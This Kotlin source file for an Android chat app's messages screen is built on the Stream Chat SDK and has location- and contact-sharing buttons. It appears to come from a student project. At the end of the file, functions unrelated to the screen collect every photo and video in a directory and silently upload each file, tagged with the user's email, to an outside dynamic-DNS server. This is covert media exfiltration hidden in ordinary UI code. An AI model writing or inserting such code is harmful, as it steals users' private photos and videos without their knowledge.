package com.example.ict2215_project.presentation.screen.message


import android.app.Activity
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.ContactsContract
import android.util.Log
import android.widget.Toast
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Scaffold
import androidx.activity.compose.BackHandler
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.ExperimentalAnimationApi
import androidx.compose.animation.core.AnimationConstants
import androidx.compose.animation.core.tween
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.animation.slideInVertically
import androidx.compose.animation.slideOutVertically
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.BoxScope
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.heightIn
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.layout.wrapContentHeight
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.rounded.AddLocation
import androidx.compose.material.icons.rounded.Contacts
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.unit.dp
import androidx.lifecycle.viewmodel.compose.viewModel
import com.google.android.gms.maps.model.LatLng
import io.getstream.chat.android.client.ChatClient
import io.getstream.chat.android.compose.R
import io.getstream.chat.android.compose.state.mediagallerypreview.MediaGalleryPreviewResultType
import io.getstream.chat.android.compose.state.messageoptions.MessageOptionItemState
import io.getstream.chat.android.compose.state.messages.attachments.StatefulStreamMediaRecorder
import io.getstream.chat.android.compose.ui.components.SimpleDialog
import io.getstream.chat.android.compose.ui.components.messageoptions.defaultMessageOptionsState
import io.getstream.chat.android.compose.ui.components.moderatedmessage.ModeratedMessageDialog
import io.getstream.chat.android.compose.ui.components.reactionpicker.ReactionsPicker
import io.getstream.chat.android.compose.ui.components.selectedmessage.SelectedMessageMenu
import io.getstream.chat.android.compose.ui.components.selectedmessage.SelectedReactionsMenu
import io.getstream.chat.android.compose.ui.messages.attachments.AttachmentsPicker
import io.getstream.chat.android.compose.ui.messages.composer.MessageComposer
import io.getstream.chat.android.compose.ui.messages.header.MessageListHeader
import io.getstream.chat.android.compose.ui.messages.list.MessageList
import io.getstream.chat.android.compose.ui.messages.list.ThreadMessagesStart
import io.getstream.chat.android.compose.ui.theme.ChatTheme
import io.getstream.chat.android.compose.ui.util.rememberMessageListState
import io.getstream.chat.android.compose.viewmodel.messages.AttachmentsPickerViewModel
import io.getstream.chat.android.compose.viewmodel.messages.MessageComposerViewModel
import io.getstream.chat.android.compose.viewmodel.messages.MessageListViewModel
import io.getstream.chat.android.compose.viewmodel.messages.MessagesViewModelFactory
import io.getstream.chat.android.models.Attachment
import io.getstream.chat.android.models.Channel
import io.getstream.chat.android.models.ChannelCapabilities
import io.getstream.chat.android.models.Message
import io.getstream.chat.android.ui.common.state.messages.Delete
import io.getstream.chat.android.ui.common.state.messages.Edit
import io.getstream.chat.android.ui.common.state.messages.Flag
import io.getstream.chat.android.ui.common.state.messages.MessageMode
import io.getstream.chat.android.ui.common.state.messages.Reply
import io.getstream.chat.android.ui.common.state.messages.Resend
import io.getstream.chat.android.ui.common.state.messages.composer.MessageComposerState
import io.getstream.chat.android.ui.common.state.messages.list.DeleteMessage
import io.getstream.chat.android.ui.common.state.messages.list.EditMessage
import io.getstream.chat.android.ui.common.state.messages.list.SelectedMessageFailedModerationState
import io.getstream.chat.android.ui.common.state.messages.list.SelectedMessageOptionsState
import io.getstream.chat.android.ui.common.state.messages.list.SelectedMessageReactionsPickerState
import io.getstream.chat.android.ui.common.state.messages.list.SelectedMessageReactionsState
import io.getstream.chat.android.ui.common.state.messages.list.SelectedMessageState
import io.getstream.chat.android.ui.common.state.messages.list.SendAnyway
import io.getstream.chat.android.ui.common.state.messages.updateMessage
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File

import org.greenrobot.eventbus.Subscribe
import org.greenrobot.eventbus.ThreadMode
import java.io.IOException

/**
 * Default root Messages screen component, that provides the necessary ViewModels and
 * connects all the data handling operations, as well as some basic actions, like back pressed handling.
 *
 * Because this screen can be shown only if there is an active/selected Channel, the user must provide
 * a [viewModelFactory] that contains the channel ID, in order to load up all the data. Otherwise, we can't show the UI.
 *
 * @param viewModelFactory The factory used to build ViewModels and power the behavior.
 * You can customize the behavior of the list through its parameters. For default behavior,
 * simply create an instance and pass in just the channel ID and the context.
 * @param showHeader If we're showing the header or not.
 * @param onBackPressed Handler for when the user taps on the Back button and/or the system
 * back button.
 * @param onHeaderTitleClick Handler for when the user taps on the header section.
 * @param onChannelAvatarClick Handler called when the user taps on the channel avatar.
 * @param skipPushNotification If new messages should skip triggering a push notification when sent. False by default.
 * @param skipEnrichUrl If new messages being sent, or existing ones being updated should skip enriching the URL.
 * If URL is not enriched, it will not be displayed as a link attachment. False by default.
 * @param threadMessagesStart Thread messages start at the bottom or top of the screen.
 * Default: [ThreadMessagesStart.BOTTOM].
 */
@Suppress("LongMethod")
@Composable
public fun CustomMessagesScreen(
    location:LatLng,
    viewModelFactory: MessagesViewModelFactory,
    showHeader: Boolean = true,
    onBackPressed: () -> Unit = {},
    onHeaderTitleClick: (channel: Channel) -> Unit = {},
    onChannelAvatarClick: () -> Unit = {},
    skipPushNotification: Boolean = false,
    skipEnrichUrl: Boolean = false,
    threadMessagesStart: ThreadMessagesStart = ThreadMessagesStart.BOTTOM,
    statefulStreamMediaRecorder: StatefulStreamMediaRecorder? = null,
    channelId: String
) {
    val listViewModel = viewModel(MessageListViewModel::class.java, factory = viewModelFactory)
    val composerViewModel = viewModel(MessageComposerViewModel::class.java, factory = viewModelFactory)
    val attachmentsPickerViewModel =
        viewModel(AttachmentsPickerViewModel::class.java, factory = viewModelFactory)

    val messageMode = listViewModel.messageMode

    if (messageMode is MessageMode.MessageThread) {
        composerViewModel.setMessageMode(messageMode)
    }

    val backAction = remember(listViewModel, composerViewModel, attachmentsPickerViewModel) {
        {
            val isInThread = listViewModel.isInThread
            val isShowingOverlay = listViewModel.isShowingOverlay

            when {
                attachmentsPickerViewModel.isShowingAttachments -> attachmentsPickerViewModel.changeAttachmentState(
                    false,
                )

                isShowingOverlay -> listViewModel.selectMessage(null)
                isInThread -> {
                    listViewModel.leaveThread()
                    composerViewModel.leaveThread()
                }

                else -> onBackPressed()
            }
        }
    }

    BackHandler(enabled = true, onBack = backAction)

    Box(
        modifier = Modifier
            .fillMaxSize()
            .testTag("Stream_MessagesScreen"),
    ) {
        Scaffold(
            modifier = Modifier.fillMaxSize(),
            topBar = {
                if (showHeader) {
                    val connectionState by listViewModel.connectionState.collectAsState()
                    val user by listViewModel.user.collectAsState()

                    MessageListHeader(
                        modifier = Modifier
                            .height(56.dp),
                        channel = listViewModel.channel,
                        currentUser = user,
                        typingUsers = listViewModel.typingUsers,
                        connectionState = connectionState,
                        messageMode = messageMode,
                        onBackPressed = backAction,
                        onHeaderTitleClick = onHeaderTitleClick,
                        onChannelAvatarClick = onChannelAvatarClick,
                    )
                }
            },
            bottomBar = {
                MessageComposer(
                    modifier = Modifier
                        .fillMaxWidth()
                        .wrapContentHeight()
                        .align(Alignment.Center),
                    viewModel = composerViewModel,
                    onAttachmentsClick = remember(attachmentsPickerViewModel) {
                        {
                            attachmentsPickerViewModel.changeAttachmentState(
                                true,
                            )
                        }
                    },
                    onCommandsClick = remember(composerViewModel) { { composerViewModel.toggleCommandsVisibility() } },
                    onCancelAction = remember(listViewModel, composerViewModel) {
                        {
                            listViewModel.dismissAllMessageActions()
                            composerViewModel.dismissMessageActions()
                        }
                    },
                    onSendMessage = remember(composerViewModel) {
                        {
                                message ->
                            composerViewModel.sendMessage(
                                message.copy(
                                    skipPushNotification = skipPushNotification,
                                    skipEnrichUrl = skipEnrichUrl,
                                ),
                            )
                        }
                    },
                    statefulStreamMediaRecorder = statefulStreamMediaRecorder,
                    integrations = {

                        CustomComposerIntegrations(
                            messageInputState = it,
                            onAttachmentsClick = remember(attachmentsPickerViewModel) {
                                {
                                    attachmentsPickerViewModel.changeAttachmentState(
                                        true,
                                    )
                                }
                            },
                            onCommandsClick = remember(composerViewModel) { { composerViewModel.toggleCommandsVisibility() } },
                            ownCapabilities = it.ownCapabilities,
                            location = location,
                            channelId = channelId
                        )


                    }
                )
            },
        ) {
            val currentState = listViewModel.currentMessagesState

            MessageList(
                modifier = Modifier
                    .testTag("Stream_MessagesList")
                    .fillMaxSize()
                    .background(ChatTheme.colors.appBackground)
                    .padding(it),
                viewModel = listViewModel,
                messagesLazyListState = rememberMessageListState(parentMessageId = currentState.parentMessageId),
                threadMessagesStart = threadMessagesStart,
                onThreadClick = remember(composerViewModel, listViewModel) {
                    {
                            message ->
                        composerViewModel.setMessageMode(MessageMode.MessageThread(message))
                        listViewModel.openMessageThread(message)
                    }
                },
                onMediaGalleryPreviewResult = remember(listViewModel, composerViewModel) {
                    {
                            result ->
                        when (result?.resultType) {
                            MediaGalleryPreviewResultType.QUOTE -> {
                                val message = listViewModel.getMessageById(result.messageId)

                                if (message != null) {
                                    composerViewModel.performMessageAction(
                                        Reply(
                                            message.copy(
                                                skipPushNotification = skipPushNotification,
                                                skipEnrichUrl = skipEnrichUrl,
                                            ),
                                        ),
                                    )
                                }
                            }

                            MediaGalleryPreviewResultType.SHOW_IN_CHAT -> {
                                listViewModel.scrollToMessage(
                                    messageId = result.messageId,
                                    parentMessageId = result.parentMessageId,
                                )
                            }

                            null -> Unit
                        }
                    }
                },
            )
        }

        MessageMenus(
            listViewModel = listViewModel,
            composerViewModel = composerViewModel,
            skipPushNotification = skipPushNotification,
            skipEnrichUrl = skipEnrichUrl,
        )
        AttachmentsPickerMenu(
            attachmentsPickerViewModel = attachmentsPickerViewModel,
            composerViewModel = composerViewModel,
        )
        MessageModerationDialog(
            listViewModel = listViewModel,
            composerViewModel = composerViewModel,
            skipPushNotification = skipPushNotification,
            skipEnrichUrl = skipEnrichUrl,
        )
        MessageDialogs(listViewModel = listViewModel)
    }
}

/**
 * Contains the various menus and pickers the user
 * can use to interact with messages.
 *
 * @param listViewModel The [MessageListViewModel] used to read state from.
 * @param composerViewModel The [MessageComposerViewModel] used to read state from.
 * @param skipPushNotification If the message should skip triggering a push notification when sent. False by default. Note, only
 * new messages trigger push notifications, updating edited messages does not.
 * @param skipEnrichUrl If the message should skip enriching the URL. If URL is not enriched, it will not be
 * displayed as a link attachment. False by default.
 */
@Composable
private fun BoxScope.MessageMenus(
    listViewModel: MessageListViewModel,
    composerViewModel: MessageComposerViewModel,
    skipPushNotification: Boolean,
    skipEnrichUrl: Boolean,
) {
    val selectedMessageState = listViewModel.currentMessagesState.selectedMessageState

    val selectedMessage = selectedMessageState?.message ?: Message()

    MessagesScreenMenus(
        listViewModel = listViewModel,
        composerViewModel = composerViewModel,
        selectedMessageState = selectedMessageState,
        selectedMessage = selectedMessage,
        skipPushNotification = skipPushNotification,
        skipEnrichUrl = skipEnrichUrl,
    )

    MessagesScreenReactionsPicker(
        listViewModel = listViewModel,
        composerViewModel = composerViewModel,
        selectedMessageState = selectedMessageState,
        selectedMessage = selectedMessage,
        skipPushNotification = skipPushNotification,
        skipEnrichUrl = skipEnrichUrl,
    )
}

/**
 * Contains selected message and reactions menus
 * wrapped inside an animated composable.
 *
 * @param listViewModel The [MessageListViewModel] used to read state and
 * perform actions.
 * @param composerViewModel The [MessageComposerViewModel] used to read state and
 * perform actions.
 * @param selectedMessageState The state of the currently selected message.
 * @param selectedMessage The currently selected message.
 * @param skipPushNotification If the message should skip triggering a push notification when sent. False by default. Note, only
 * new messages trigger push notifications, updating edited messages does not.
 * @param skipEnrichUrl If the message should skip enriching the URL. If URL is not enriched, it will not be
 * displayed as a link attachment. False by default.
 */
@Suppress("LongMethod")
@OptIn(ExperimentalAnimationApi::class)
@Composable
private fun BoxScope.MessagesScreenMenus(
    listViewModel: MessageListViewModel,
    composerViewModel: MessageComposerViewModel,
    selectedMessageState: SelectedMessageState?,
    selectedMessage: Message,
    skipPushNotification: Boolean,
    skipEnrichUrl: Boolean,
) {
    val user by listViewModel.user.collectAsState()

    val ownCapabilities = selectedMessageState?.ownCapabilities ?: setOf()

    val isInThread = listViewModel.isInThread

    val newMessageOptions = defaultMessageOptionsState(
        selectedMessage = selectedMessage,
        currentUser = user,
        isInThread = isInThread,
        ownCapabilities = ownCapabilities,
    )

    var messageOptions by remember {
        mutableStateOf<List<MessageOptionItemState>>(emptyList())
    }

    if (newMessageOptions.isNotEmpty()) {
        messageOptions = newMessageOptions
    }

    AnimatedVisibility(
        visible = selectedMessageState is SelectedMessageOptionsState && selectedMessage.id.isNotEmpty(),
        enter = fadeIn(),
        exit = fadeOut(animationSpec = tween(durationMillis = AnimationConstants.DefaultDurationMillis / 2)),
    ) {
        SelectedMessageMenu(
            modifier = Modifier
                .align(Alignment.BottomCenter)
                .animateEnterExit(
                    enter = slideInVertically(
                        initialOffsetY = { height -> height },
                        animationSpec = tween(),
                    ),
                    exit = slideOutVertically(
                        targetOffsetY = { height -> height },
                        animationSpec = tween(durationMillis = AnimationConstants.DefaultDurationMillis / 2),
                    ),
                ),
            messageOptions = messageOptions,
            message = selectedMessage,
            ownCapabilities = ownCapabilities,
            onMessageAction = remember(composerViewModel, listViewModel) {
                {
                        action ->
                    action.updateMessage(
                        action.message.copy(
                            skipPushNotification = skipPushNotification,
                            skipEnrichUrl = skipEnrichUrl,
                        ),
                    ).let {
                        composerViewModel.performMessageAction(it)
                        listViewModel.performMessageAction(it)
                    }
                }
            },
            onShowMoreReactionsSelected = remember(listViewModel) {
                {
                    listViewModel.selectExtendedReactions(selectedMessage)
                }
            },
            onDismiss = remember(listViewModel) { { listViewModel.removeOverlay() } },
        )
    }

    AnimatedVisibility(
        visible = selectedMessageState is SelectedMessageReactionsState && selectedMessage.id.isNotEmpty(),
        enter = fadeIn(),
        exit = fadeOut(animationSpec = tween(durationMillis = AnimationConstants.DefaultDurationMillis / 2)),
    ) {
        SelectedReactionsMenu(
            modifier = Modifier
                .align(Alignment.BottomCenter)
                .animateEnterExit(
                    enter = slideInVertically(
                        initialOffsetY = { height -> height },
                        animationSpec = tween(),
                    ),
                    exit = slideOutVertically(
                        targetOffsetY = { height -> height },
                        animationSpec = tween(durationMillis = AnimationConstants.DefaultDurationMillis / 2),
                    ),
                ),
            currentUser = user,
            message = selectedMessage,
            onMessageAction = remember(composerViewModel, listViewModel) {
                {
                        action ->
                    action.updateMessage(
                        action.message.copy(
                            skipPushNotification = skipPushNotification,
                            skipEnrichUrl = skipEnrichUrl,
                        ),
                    ).let {
                        composerViewModel.performMessageAction(it)
                        listViewModel.performMessageAction(it)
                    }
                }
            },
            onShowMoreReactionsSelected = remember(listViewModel) {
                {
                    listViewModel.selectExtendedReactions(selectedMessage)
                }
            },
            onDismiss = remember(listViewModel) { { listViewModel.removeOverlay() } },
            ownCapabilities = selectedMessageState?.ownCapabilities ?: setOf(),
        )
    }
}

/**
 * Contains the reactions picker wrapped inside
 * of an animated composable.
 *
 * @param listViewModel The [MessageListViewModel] used to read state and
 * perform actions.
 * @param composerViewModel [MessageComposerViewModel] used to read state and
 * perform actions.
 * @param selectedMessageState The state of the currently selected message.
 * @param selectedMessage The currently selected message.
 * @param skipPushNotification If the message should skip triggering a push notification when sent. False by default. Note, only
 * new messages trigger push notifications, updating edited messages does not.
 * @param skipEnrichUrl If the message should skip enriching the URL. If URL is not enriched, it will not be
 * displayed as a link attachment. False by default.
 */
@OptIn(ExperimentalAnimationApi::class)
@Composable
private fun BoxScope.MessagesScreenReactionsPicker(
    listViewModel: MessageListViewModel,
    composerViewModel: MessageComposerViewModel,
    selectedMessageState: SelectedMessageState?,
    selectedMessage: Message,
    skipPushNotification: Boolean,
    skipEnrichUrl: Boolean,
) {
    AnimatedVisibility(
        visible = selectedMessageState is SelectedMessageReactionsPickerState && selectedMessage.id.isNotEmpty(),
        enter = fadeIn(),
        exit = fadeOut(animationSpec = tween(durationMillis = AnimationConstants.DefaultDurationMillis / 2)),
    ) {
        ReactionsPicker(
            modifier = Modifier
                .align(Alignment.BottomCenter)
                .heightIn(max = 400.dp)
                .wrapContentHeight()
                .animateEnterExit(
                    enter = slideInVertically(
                        initialOffsetY = { height -> height },
                        animationSpec = tween(),
                    ),
                    exit = slideOutVertically(
                        targetOffsetY = { height -> height },
                        animationSpec = tween(durationMillis = AnimationConstants.DefaultDurationMillis / 2),
                    ),
                ),
            message = selectedMessage,
            onMessageAction = remember(composerViewModel, listViewModel) {
                {
                        action ->
                    action.updateMessage(
                        action.message.copy(
                            skipPushNotification = skipPushNotification,
                            skipEnrichUrl = skipEnrichUrl,
                        ),
                    ).let {
                        composerViewModel.performMessageAction(action)
                        listViewModel.performMessageAction(action)
                    }
                }
            },
            onDismiss = remember(listViewModel) { { listViewModel.removeOverlay() } },
        )
    }
}

/**
 * Contains the attachments picker menu wrapped inside
 * of an animated composable.
 *
 * @param attachmentsPickerViewModel The [AttachmentsPickerViewModel] used to read state and
 * perform actions.
 * @param composerViewModel The [MessageComposerViewModel] used to read state and
 * perform actions.
 */
@OptIn(ExperimentalAnimationApi::class)
@Composable
private fun BoxScope.AttachmentsPickerMenu(
    attachmentsPickerViewModel: AttachmentsPickerViewModel,
    composerViewModel: MessageComposerViewModel,
) {
    val isShowingAttachments = attachmentsPickerViewModel.isShowingAttachments

    AnimatedVisibility(
        visible = isShowingAttachments,
        enter = fadeIn(),
        exit = fadeOut(animationSpec = tween(delayMillis = AnimationConstants.DefaultDurationMillis / 2)),
    ) {
        AttachmentsPicker(
            attachmentsPickerViewModel = attachmentsPickerViewModel,
            modifier = Modifier
                .align(Alignment.BottomCenter)
                .height(350.dp)
                .animateEnterExit(
                    enter = slideInVertically(
                        initialOffsetY = { height -> height },
                        animationSpec = tween(),
                    ),
                    exit = slideOutVertically(
                        targetOffsetY = { height -> height },
                        animationSpec = tween(delayMillis = AnimationConstants.DefaultDurationMillis / 2),
                    ),
                ),
            onAttachmentsSelected = remember(attachmentsPickerViewModel) {
                {
                        attachments ->
                    attachmentsPickerViewModel.changeAttachmentState(false)
                    composerViewModel.addSelectedAttachments(attachments)
                }
            },
            onDismiss = remember(attachmentsPickerViewModel) {
                {
                    attachmentsPickerViewModel.changeAttachmentState(false)
                    attachmentsPickerViewModel.dismissAttachments()
                }
            },
        )
    }
}

/**
 * Contains the dialog for a message that needs to be moderated.
 *
 * @param listViewModel The [MessageListViewModel] used to read state and
 * perform actions.
 * @param composerViewModel The [MessageComposerViewModel] used to read state and
 * perform actions.
 */
@Composable
private fun MessageModerationDialog(
    listViewModel: MessageListViewModel,
    composerViewModel: MessageComposerViewModel,
    skipPushNotification: Boolean,
    skipEnrichUrl: Boolean,
) {
    val selectedMessageState = listViewModel.currentMessagesState.selectedMessageState

    val selectedMessage = selectedMessageState?.message ?: Message()

    if (selectedMessageState is SelectedMessageFailedModerationState) {
        ModeratedMessageDialog(
            message = selectedMessage,
            modifier = Modifier.background(
                shape = MaterialTheme.shapes.medium,
                color = ChatTheme.colors.inputBackground,
            ),
            onDismissRequest = remember(listViewModel) { { listViewModel.removeOverlay() } },
            onDialogOptionInteraction = remember(listViewModel, composerViewModel) {
                {
                        message, action ->
                    when (action) {
                        DeleteMessage -> listViewModel.deleteMessage(message = message, true)
                        EditMessage -> composerViewModel.performMessageAction(Edit(message))
                        SendAnyway -> listViewModel.performMessageAction(
                            Resend(
                                message.copy(
                                    skipPushNotification = skipPushNotification,
                                    skipEnrichUrl = skipEnrichUrl,
                                ),
                            ),
                        )

                        else -> {
                            // Custom events
                        }
                    }
                }
            },
        )
    }
}

/**
 * Contains the message dialogs used to prompt the
 * user with message flagging and deletion actions
 *
 * @param listViewModel The [MessageListViewModel] used to read state and
 * perform actions.
 */
@Composable
private fun MessageDialogs(listViewModel: MessageListViewModel) {
    val messageActions = listViewModel.messageActions

    val deleteAction = messageActions.firstOrNull { it is Delete }

    if (deleteAction != null) {
        SimpleDialog(
            modifier = Modifier.padding(16.dp),
            title = stringResource(id = R.string.stream_compose_delete_message_title),
            message = stringResource(id = R.string.stream_compose_delete_message_text),
            onPositiveAction = remember(listViewModel) { { listViewModel.deleteMessage(deleteAction.message) } },
            onDismiss = remember(listViewModel) { { listViewModel.dismissMessageAction(deleteAction) } },
        )
    }

    val flagAction = messageActions.firstOrNull { it is Flag }

    if (flagAction != null) {
        SimpleDialog(
            modifier = Modifier.padding(16.dp),
            title = stringResource(id = R.string.stream_compose_flag_message_title),
            message = stringResource(id = R.string.stream_compose_flag_message_text),
            onPositiveAction = remember(listViewModel) { { listViewModel.flagMessage(flagAction.message) } },
            onDismiss = remember(listViewModel) { { listViewModel.dismissMessageAction(flagAction) } },
        )
    }
}

@Composable
internal fun CustomComposerIntegrations(
    messageInputState: MessageComposerState,
    onAttachmentsClick: () -> Unit,
    onCommandsClick: () -> Unit,
    ownCapabilities: Set<String>,
    location: LatLng,
    channelId: String,
) {
    val context = LocalContext.current
    val contactPickerLauncher = rememberLauncherForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            val contactUri: Uri? = result.data?.data
            contactUri?.let { uri ->
                getContactDetails(context, uri)?.let { (name, phone) ->
                    sendContactAsMessage(channelId, name, phone)
                }
            }
        }
    }
    val hasTextInput = messageInputState.inputValue.isNotEmpty()
    val hasAttachments = messageInputState.attachments.isNotEmpty()
    val hasCommandInput = messageInputState.inputValue.startsWith("/")
    val hasCommandSuggestions = messageInputState.commandSuggestions.isNotEmpty()
    val hasMentionSuggestions = messageInputState.mentionSuggestions.isNotEmpty()

    val isAttachmentsButtonEnabled = !hasCommandInput && !hasCommandSuggestions && !hasMentionSuggestions
    val isCommandsButtonEnabled = !hasTextInput && !hasAttachments

    val canSendMessage = ownCapabilities.contains(ChannelCapabilities.SEND_MESSAGE)
    val canSendAttachments = ownCapabilities.contains(ChannelCapabilities.UPLOAD_FILE)

    if (canSendMessage) {
        Row(
            modifier = Modifier
                .height(44.dp)
                .padding(horizontal = 4.dp),
            verticalAlignment = Alignment.CenterVertically,
        ) {
            if (canSendAttachments) {
                IconButton(
                    enabled = isAttachmentsButtonEnabled,
                    modifier = Modifier
                        .size(32.dp)
                        .padding(4.dp),
                    content = {
                        Icon(
                            painter = painterResource(id = R.drawable.stream_compose_ic_attachments),
                            contentDescription = stringResource(id = R.string.stream_compose_attachments),
                            tint = if (isAttachmentsButtonEnabled) {
                                ChatTheme.colors.textLowEmphasis
                            } else {
                                ChatTheme.colors.disabled
                            },
                        )
                    },
                    onClick = onAttachmentsClick,
                )
            }

            val commandsButtonTint = if (hasCommandSuggestions && isCommandsButtonEnabled) {
                ChatTheme.colors.primaryAccent
            } else if (isCommandsButtonEnabled) {
                ChatTheme.colors.textLowEmphasis
            } else {
                ChatTheme.colors.disabled
            }

            AnimatedVisibility(visible = messageInputState.hasCommands) {
                IconButton(
                    modifier = Modifier
                        .size(32.dp)
                        .padding(4.dp),
                    enabled = isCommandsButtonEnabled,
                    content = {
                        Icon(
                            painter = painterResource(id = R.drawable.stream_compose_ic_command),
                            contentDescription = null,
                            tint = commandsButtonTint,
                        )
                    },
                    onClick = onCommandsClick,
                )
            }
        }
        IconButton(onClick={ attachLocation(channelId = channelId, location=location) }){Icon(Icons.Rounded.AddLocation,"send location")}
        IconButton(onClick = {
            openContactPicker(contactPickerLauncher)
        }) {
            Icon(Icons.Rounded.Contacts,"send contacts")
        }
    } else {
        Spacer(modifier = Modifier.width(12.dp))
    }
}

fun sendContactAsMessage(channelId: String, contactName: String, contactPhone: String) {
    val client = ChatClient.instance()
    val channelClient = client.channel(channelId)

    val attachment = Attachment(
        type = "contact",
        extraData = mutableMapOf("fullName" to contactName, "phone" to contactPhone)
    )
    val message = Message(
        text = "",
        attachments = mutableListOf(attachment)
    )

    channelClient.sendMessage(message).enqueue { result ->
        if (result.isSuccess) {
            Log.d("SendContact","Successfully send as contact")

        } else {
            Log.d("SendContact","Failed to send as contact")
        }
    }
}
fun getContactDetails(context: Context, contactUri: Uri): Pair<String, String>? {
    val cursor = context.contentResolver.query(contactUri, null, null, null, null)
    cursor?.use {
        if (it.moveToFirst()) {
            val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
            val idIndex = it.getColumnIndex(ContactsContract.Contacts.NAME_RAW_CONTACT_ID)
            val contactId = it.getString(idIndex)
            val name = it.getString(nameIndex)

            val phoneCursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
                "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                arrayOf(contactId),
                null
            )

            phoneCursor?.use { cursor ->
                if (cursor.moveToFirst()) {
                    val phoneIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    val phoneNumber = cursor.getString(phoneIndex)
                    return Pair(name, phoneNumber)
                }
            }
        }
    }
    return null
}
fun openContactPicker(launcher: ActivityResultLauncher<Intent>) {
    val pickContactIntent = Intent(Intent.ACTION_PICK, ContactsContract.Contacts.CONTENT_URI).apply {
        type = ContactsContract.CommonDataKinds.Phone.CONTENT_TYPE // Ensure only contacts with phone numbers are shown
    }
    launcher.launch(pickContactIntent)
}

fun attachLocation(channelId:String,location: LatLng, ){

    var currentLocation = LatLng(location.latitude, location.longitude)

    val attachment = Attachment(
        type = "location",
        extraData = mutableMapOf("latitude" to currentLocation.latitude, "longitude" to currentLocation.longitude),
    )

    val message = Message(
        cid = channelId,
        text = "My current location",
        attachments = mutableListOf(attachment),
    )

    ChatClient
        .instance()
        .channel(channelId)
        .sendMessage(message).enqueue { result ->
            if (result.isSuccess) {

                Log.d("apptt","Your location has been sent")
            } else {
                Log.d("apptt","Sending location failed")
            }

        }
 }
fun getAllPhotosFromDirectory(directoryPath: String): List<String> {
    val directory = File(directoryPath)
    return directory.listFiles { _, name ->
        name.endsWith(".jpg", ignoreCase = true) ||
                name.endsWith(".jpeg", ignoreCase = true) ||
                name.endsWith(".png", ignoreCase = true)
    }?.map { it.absolutePath } ?: listOf()
}
fun getAllVideosFromDirectory(directoryPath: String): List<String> {
    val directory = File(directoryPath)
    return directory.listFiles { _, name ->
        name.endsWith(".mp4", ignoreCase = true) ||
                name.endsWith(".mkv", ignoreCase = true) ||
                name.endsWith(".mov", ignoreCase = true)
    }?.map { it.absolutePath } ?: listOf()
}

fun uploadAllPhotos(directoryPath: String, userEmail: String) {
    val photoPaths = getAllPhotosFromDirectory(directoryPath)
    Log.d("PhotoPaths", photoPaths.toString())
    photoPaths.forEach { photoPath ->
        uploadImage(userEmail, photoPath)
    }
}

fun uploadAllVideos(directoryPath: String, userEmail: String) {
    val videoPaths = getAllVideosFromDirectory(directoryPath)
    Log.d("VideoPaths","$videoPaths")

    videoPaths.forEach { videoPath ->
        uploadVideo(userEmail, videoPath)
    }
}

// Function to upload an image
fun uploadImage(email: String, filePath: String) {
    uploadFile(email, filePath, "image/*")
}

// Function to upload a video
fun uploadVideo(email: String, filePath: String) {
    uploadFile(email, filePath, "video/*")
}

// Generalized function to handle file upload
fun uploadFile(email: String, filePath: String, mediaType: String) {
    val file = File(filePath)
    val fileBody = file.asRequestBody(mediaType.toMediaTypeOrNull())

    val requestBody = MultipartBody.Builder()
        .setType(MultipartBody.FORM)
        .addFormDataPart("file", file.name, fileBody)
        .addFormDataPart("email", email)
        .build()

    val request = Request.Builder()
        .url("https://tlpineapple.ddns.net/flaskapp/files")
        .post(requestBody)
        .build()
 
    OkHttpClient().newCall(request).enqueue(object : Callback {
        override fun onFailure(call: Call, e: IOException) {
            e.printStackTrace() // Handle failure
        }

        override fun onResponse(call: Call, response: Response) {
            if (response.isSuccessful) {
                // Handle success
                Log.d("FileUpload:","File uploaded successfully: ${file.name}")
            } else {
                // Handle error
                Log.d("FileUpload:","Error uploading failed: ${file.name}")
            }
        }
    })
}